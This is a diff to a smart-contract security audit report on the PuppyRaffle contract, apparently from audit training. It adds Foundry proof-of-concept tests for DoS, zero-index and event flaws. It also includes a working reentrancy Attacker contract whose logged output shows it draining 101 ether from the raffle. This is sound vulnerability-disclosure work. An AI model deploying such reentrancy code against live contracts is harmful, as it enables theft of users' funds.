@@ -194,11 +194,7 @@ raffleStartTime = block.timestamp;
 // @danger: players may rigged the lottery
 
 // @BUG: newPlayers with zero length can bypass the check
-// @issue: emits RaffleEnter event on zero player(s) entry
-
-// @BUG: Adversaries can create gaps into players array and can also pass phantom addresses
-// @issue: DoS due to non-existent winner(s), nobody withdraws rewards.
-require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+// @issue: DoS due to underflow wrap around (infinite loop)
 
 // ...
 
@@ -236,7 +232,7 @@ function getActivePlayerIndex(address player) external view returns (uint256) {
         }
     }
     // @BUG: Returns index 0 for non-existent player
-    // @danger: mislead users especially users who're about to retreat and want their refund
+    // @danger: misleads users especially users who're about to retreat and want their refund
     return 0;
 }
 ```
@@ -292,6 +288,7 @@ require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are cur
 - _isActivePlayer:
 
 ```solidity
+// @Note: dEaD fUnCtIoN
 function _isActivePlayer() internal view returns (bool) {
     // @BUG: Finding active player in a Big players array is dangerous
     // @danger: Gas exhaustion revert the lookup therefore DoS occurs
@@ -355,6 +352,8 @@ test/PuppyRaffleTest.t.sol:226:9: TypeError: Member "setRaffleDuration" not foun
 ```
 
 ### testVariablesCanBeSetAsConstantsCauseExcessiveDeploymentCost:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
 
 ```solidity
 function testVariablesCanBeSetAsConstantsCauseExcessiveDeploymentCost() public {
@@ -428,6 +427,332 @@ function testVariablesCanBeSetAsConstantsCauseExcessiveDeploymentCost() public {
 
 ###
 
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testUnIndexedEventsMakeOffChainToolsLivesHard() public playersEntered {
+    // First: RaffleRefunded
+
+    vm.startPrank(playerThree);
+    vm.expectEmit(false, false, false, true, address(puppyRaffle));
+    emit RaffleRefunded(playerThree);
+
+    uint256 playerThreeIndex = puppyRaffle.getActivePlayerIndex(playerThree);
+    vm.recordLogs();
+    puppyRaffle.refund(playerThreeIndex);
+    vm.stopPrank();
+
+    Vm.Log[] memory refundLogs = vm.getRecordedLogs();
+
+    bytes32[] memory refundTopics = refundLogs[0].topics;
+    bytes memory refundData = refundLogs[0].data;
+    address refundEmitter = refundLogs[0].emitter;
+
+    console2.log("---------");
+    console2.log("Event signature: ");
+    console2.logBytes32(refundTopics[0]);
+    console2.log("---------");
+
+    console2.log("---------");
+    console2.log("data: ");
+    console2.logBytes(refundData);
+    console2.log("---------");
+
+    console2.log("---------");
+    console2.log("Emitter: ", refundEmitter);
+    console2.log("---------");
+
+    assertEq(refundTopics[0], keccak256(abi.encodePacked("RaffleRefunded(address)")));
+    assertEq(refundData, abi.encode(bytes32(uint256(uint160(playerThree)))));
+    assertEq(refundEmitter, address(puppyRaffle));
+    // Note: here topics length is 1 therefore, no topic the first one is the event signature itself.
+    assertEq(refundTopics.length, 1);
+
+    // Second: FeeAddressChanged
+
+    vm.startPrank(puppyRaffle.owner());
+    vm.expectEmit(false, false, false, true, address(puppyRaffle));
+    emit FeeAddressChanged(newFeeAddress);
+
+    vm.recordLogs();
+    puppyRaffle.changeFeeAddress(newFeeAddress);
+    vm.stopPrank();
+
+    Vm.Log[] memory feeAddressChangeLogs = vm.getRecordedLogs();
+
+    bytes32[] memory feeAddressChangeTopics = feeAddressChangeLogs[0].topics;
+    bytes memory feeAddressChangeData = feeAddressChangeLogs[0].data;
+    address feeAddressChangeEmitter = feeAddressChangeLogs[0].emitter;
+
+    console2.log("---------");
+    console2.log("Event signature: ");
+    console2.logBytes32(feeAddressChangeTopics[0]);
+    console2.log("---------");
+
+    console2.log("---------");
+    console2.log("data: ");
+    console2.logBytes(feeAddressChangeData);
+    console2.log("---------");
+
+    console2.log("---------");
+    console2.log("Emitter: ", feeAddressChangeEmitter);
+    console2.log("---------");
+
+    assertEq(feeAddressChangeTopics[0], keccak256(abi.encodePacked("FeeAddressChanged(address)")));
+    assertEq(feeAddressChangeData, abi.encode(bytes32(uint256(uint160(newFeeAddress)))));
+    assertEq(feeAddressChangeEmitter, address(puppyRaffle));
+    // Note: here topics length is 1 therefore, no topic the first one is the event signature itself.
+    assertEq(feeAddressChangeTopics.length, 1);
+}
+```
+
+### testConstructorParametersMissingZeroChecks:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testConstructorParametersMissingZeroChecks() public {
+    PuppyRaffle uselessRaffle = new PuppyRaffle(0, address(0), 0);
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testConstructorParametersMissingZeroChecks() (gas: 4443709)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 599.58µs (100.97µs CPU time)
+
+Ran 1 test suite in 4.28ms (599.58µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testRaffleDurationMissingMinMaxTemporalLoomThreshold:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testRaffleDurationMissingMinMaxTemporalLoomThreshold() public {
+    // First: Let's deploy raffle with no duration
+    new PuppyRaffle(entranceFee, feeAddress, 0);
+
+    // Now: Let's deploy raffle with a prolong duration i.e., 100 years hahaha
+    new PuppyRaffle(entranceFee, feeAddress, 365 days * 100);
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testRaffleDurationMissingMinMaxTemporalLoomThreshold() (gas: 8944935)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 669.71µs (182.12µs CPU time)
+
+Ran 1 test suite in 4.62ms (669.71µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testDoSDueToSoManyEntrantsIntoLottery:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testDoSDueToSoManyEntrantsIntoLottery() public {
+    address[] memory newPlayers = new address[](100);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    address[] memory anotherNewPlayers = new address[](1000);
+    for (uint256 i; i < anotherNewPlayers.length; i++) {
+        anotherNewPlayers[i] = address(i + 101);
+    }
+
+    vm.expectRevert();
+    puppyRaffle.enterRaffle{value: anotherNewPlayers.length * entranceFee}(anotherNewPlayers);
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testDoSDueToSoManyEntrantsIntoLottery() (gas: 1057326719)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 214.98ms (214.41ms CPU time)
+
+Ran 1 test suite in 215.51ms (214.98ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testAttackerCanDrainTheRaffle:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`), You know well how to place these units :)
+
+```solidity
+function testAttackerCanDrainTheRaffle() public {
+    address[] memory newPlayers = new address[](100);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    Attacker attacker = new Attacker(address(puppyRaffle));
+    address[] memory attackerAsPlayer = new address[](1);
+    attackerAsPlayer[0] = address(attacker);
+
+    vm.deal(address(attacker), 1 ether);
+
+    vm.startPrank(address(attacker));
+    puppyRaffle.enterRaffle{value: attackerAsPlayer.length * entranceFee}(attackerAsPlayer);
+
+    uint256 attackerBalanceBeforeAttack = address(attacker).balance;
+    uint256 raffleBalanceBeforeAttack = address(puppyRaffle).balance;
+    uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
+
+    puppyRaffle.refund(attackerIndex);
+
+    uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+    uint256 attackerBalanceAfterAttack = address(attacker).balance;
+    vm.stopPrank();
+
+    console2.log("attackerBalanceBeforeAttack: ", attackerBalanceBeforeAttack);
+    console2.log("attackerBalanceAfterAttack : ", attackerBalanceAfterAttack);
+    console2.log("raffleBalanceBeforeAttack  : ", raffleBalanceBeforeAttack);
+    console2.log("raffleBalanceAfterAttack   : ", raffleBalanceAfterAttack);
+
+    assertEq(attackerBalanceAfterAttack, 101 ether);
+    assertEq(attackerBalanceBeforeAttack, 0);
+    assertEq(raffleBalanceBeforeAttack, 101 ether);
+    assertEq(raffleBalanceAfterAttack, 0);
+}
+
+contract Attacker {
+    PuppyRaffle puppyRaffle;
+
+    receive() external payable {
+        attack();
+    }
+
+    constructor(address _puppyRaffleAddress) {
+        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
+    }
+
+    function attack() public {
+        if (address(puppyRaffle).balance > 0 || address(puppyRaffle).balance >= puppyRaffle.entranceFee()) {
+            uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+```
+
+- output
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testAttackerCanDrainTheRaffle() (gas: 75172735)
+Logs:
+  attackerBalanceBeforeAttack:  0
+  attackerBalanceAfterAttack :  101000000000000000000
+  raffleBalanceBeforeAttack  :  101000000000000000000
+  raffleBalanceAfterAttack   :  0
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.99ms (16.34ms CPU time)
+
+Ran 1 test suite in 17.37ms (16.99ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testGetActivePlayerIndexDoSDueToSoManyEntrants:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testGetActivePlayerIndexDoSDueToSoManyEntrants() public {
+    // @Note: To prove this bug we have to perform a mutational test...
+    // First, remove or comment-out the following chunk from the `enterRaffle` function, it also contains the same class of bug though.
+    /*
+    for (uint256 i = 0; i < players.length - 1; i++) {
+        for (uint256 j = i + 1; j < players.length; j++) {
+            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+        }
+    }
+    */
+
+    // Now perform the test below...
+    // Ready?......
+
+    address[] memory newPlayers = new address[](43000);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    vm.expectRevert(); // Revert due to Out of Gas exception
+    puppyRaffle.getActivePlayerIndex(address(43001));
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testGetActivePlayerIndexDoSDueToSoManyEntrants() (gas: 1073183316)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 92.80ms (92.22ms CPU time)
+
+Ran 1 test suite in 96.81ms (92.80ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+### testReturnsZeroForNonExistentPlayers:
+
+- input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testReturnsZeroForNonExistentPlayers() public {
+    address[] memory newPlayers = new address[](10);
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(11));
+
+    console2.log("Player index: ", playerIndex);
+    assertEq(playerIndex, 0);
+}
+```
+
+- output:
+
+```bash
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testReturnsZeroForNonExistentPlayers() (gas: 510102)
+Logs:
+  Player index:  0
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 739.39µs (118.72µs CPU time)
+
+Ran 1 test suite in 5.89ms (739.39µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
 
 
 
@@ -439,4 +764,4 @@ function testVariablesCanBeSetAsConstantsCauseExcessiveDeploymentCost() public {
 <br/>
 <br/>
 
-##### Auditor|Sec-Res|Hacker: *theirrationalone*
+##### Auditor|Sec-Res|White-Hat: *theirrationalone*
